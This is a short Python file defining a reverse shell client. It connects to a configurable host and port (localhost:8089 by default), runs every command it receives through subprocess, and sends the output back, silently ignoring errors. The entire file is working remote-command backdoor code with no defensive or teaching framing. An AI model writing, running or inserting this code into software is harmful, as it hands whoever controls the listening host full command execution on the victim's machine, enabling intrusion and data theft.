
class ReverseConfiguration:
    def __init__(self, host="127.0.0.1", port=8089):
        self.host = host
        self.port = port

def reverse_shell_client(config: ReverseConfiguration = ReverseConfiguration()):
    import socket, subprocess, os

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((config.host, config.port))
        while True:
            cmd = s.recv(4096).decode().strip()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
    except Exception as e:
        pass
    finally:
        s.close()




